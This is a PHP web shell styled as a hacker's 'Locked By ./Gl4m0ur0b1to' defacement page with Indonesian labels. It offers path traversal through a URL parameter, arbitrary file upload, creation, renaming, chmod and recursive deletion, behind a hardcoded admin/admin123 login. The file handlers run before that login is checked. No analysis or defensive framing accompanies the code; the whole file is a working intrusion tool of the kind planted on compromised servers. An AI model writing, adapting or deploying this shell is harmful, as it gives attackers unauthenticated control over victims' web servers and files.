<?php
session_start();
$dir = isset($_GET['path']) ? $_GET['path'] : getcwd();
if (isset($_POST['create_file']) && isset($_POST['file_name'])) file_put_contents($dir . '/' . $_POST['file_name'], '');
if (isset($_POST['create_folder']) && isset($_POST['folder_name'])) mkdir($dir . '/' . $_POST['folder_name']);
if (isset($_POST['upload_file']) && isset($_FILES['file'])) move_uploaded_file($_FILES['file']['tmp_name'], $dir . '/' . $_FILES['file']['name']);
if (isset($_POST['rename']) && isset($_POST['old_name']) && isset($_POST['new_name'])) rename($dir . '/' . $_POST['old_name'], $dir . '/' . $_POST['new_name']);
if (isset($_POST['chmod']) && isset($_POST['chmod_target'])) chmod($dir . '/' . $_POST['chmod_target'], 0775);

if (isset($_GET['delete']) && is_file($dir . '/' . $_GET['delete'])) {
    unlink($dir . '/' . $_GET['delete']);
} elseif (isset($_GET['delete']) && is_dir($dir . '/' . $_GET['delete'])) {
    $files = array_diff(scandir($dir . '/' . $_GET['delete']), array('.', '..'));
    foreach ($files as $file) {
        $filePath = $dir . '/' . $_GET['delete'] . '/' . $file;
        if (is_dir($filePath)) rmdir($filePath);
        else unlink($filePath);
    }
    rmdir($dir . '/' . $_GET['delete']);
}

$files = scandir($dir);

if (isset($_POST['login'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    if ($username == 'admin' && $password == 'admin123') {
        $_SESSION['logged_in'] = true;
    } else {
        echo "<script>alert('Login Failed!');</script>";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="Author" content="0b1t0gl4m0ur">
    <meta name="keywords" content="locked, by, G L A M O U R, O B L I V I O N, " />
    <title>Locked By ./Gl4m0ur0b1to</title>
    <style>
        @keyframes rgbGlow { 0% { border-color: red; } 25% { border-color: orange; } 50% { border-color: green; } 75% { border-color: blue; } 100% { border-color: violet; } }
        body {
            background: url('https://files.catbox.moe/4vvb0m.jpg') no-repeat center center fixed;
            background-size: cover;
            color: #ff5555;
            font-family: monospace;
            margin: 0;
            overflow: hidden;
        }
        .container { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; }
        table {
            width: 100%;
            height: 100%;
            margin: 10px 0;
            border-collapse: collapse;
            background: rgba(0, 0, 0, 0.8);
            border: 5px solid;
            border-radius: 10px;
            animation: rgbGlow 2s infinite;
        }
        th, td {
            border: 1px solid #ff5555;
            padding: 8px;
            text-align: left;
        }
        th { background-color: #1a1a1a; }
        input, button, a {
            background-color: #262626;
            color: #ff5555;
            border: 1px solid #ff5555;
            border-radius: 4px;
            padding: 5px 10px;
            text-decoration: none;
            margin: 5px 0;
        }
        button:hover, a:hover { background-color: #ff5555; color: #0d0d0d; }
        audio {
            position: absolute;
            top: -9999px;
        }
        .login-form { display: flex; justify-content: center; align-items: center; flex-direction: column; margin-top: 50px; }
        .login-form input, .login-form button {
            margin: 5px;
            padding: 10px;
            width: 300px;
        }
        .login-form button {
            background-color: #ff5555;
            color: black;
        }
    </style>
</head>
<body>
    <audio autoplay loop>
        <audio autoplay loop>
  <source src="https://a.top4top.io/m_3004wn0wf1.mp3" type="audio/mp3">
</audio>
    </audio>
    <div class="container">
        <?php if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true): ?>
        <div class="login-form">
            <form method="post">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="login">Login</button>
            </form>
        </div>
        <?php else: ?>
        <form method="post" enctype="multipart/form-data">
            <table>
                <tr>
                    <td colspan="2">
                        <input type="text" name="file_name" placeholder="Nama File">
                        <button type="submit" name="create_file">Buat File</button>
                    </td>
                </tr>
                <tr>
                    <td colspan="2">
                        <input type="text" name="folder_name" placeholder="Nama Folder">
                        <button type="submit" name="create_folder">Buat Folder</button>
                    </td>
                </tr>
                <tr>
                    <td colspan="2">
                        <input type="file" name="file">
                        <button type="submit" name="upload_file">Unggah File</button>
                    </td>
                </tr>
                <tr>
                    <td>
                        <table>
                            <?php if (count($files) > 2): ?>
                                <tr>
                                <audio autoplay loop>
  <source src="https://a.top4top.io/m_3004wn0wf1.mp3" type="audio/mp3">
</audio>
                                    <th>Nama</th>
                                    <th>Aksi</th>
                                </tr>
                                <?php foreach ($files as $file): ?>
                                    <?php if ($file != '.' && $file != '..'): ?>
                                        <tr>
                                            <td><?php echo $file; ?></td>
                                            <td>
                                                <?php if (is_file($dir . '/' . $file)): ?>
                                                    <form method="post" style="display:inline;">
                                                        <input type="text" name="chmod_target" value="<?php echo $file; ?>" hidden>
                                                        <button type="submit" name="chmod">CHMOD 0775</button>
                                                    </form>
                                                    <a href="?path=<?php echo urlencode($dir); ?>&delete=<?php echo urlencode($file); ?>">Hapus</a>
                                                <?php elseif (is_dir($dir . '/' . $file)): ?>
                                                    <a href="?path=<?php echo urlencode($dir . '/' . $file); ?>">Buka</a>
                                                    <a href="?path=<?php echo urlencode($dir); ?>&delete=<?php echo urlencode($file); ?>">Hapus</a>
                                                <?php endif; ?>
                                            </td>
                                        </tr>
                                    <?php endif; ?>
                                <?php endforeach; ?>
                            <?php endif; ?>
                        </table>
                    </td>
                </tr>
            </table>
        </form>
        <?php endif; ?>
    </div>
</body>
</html>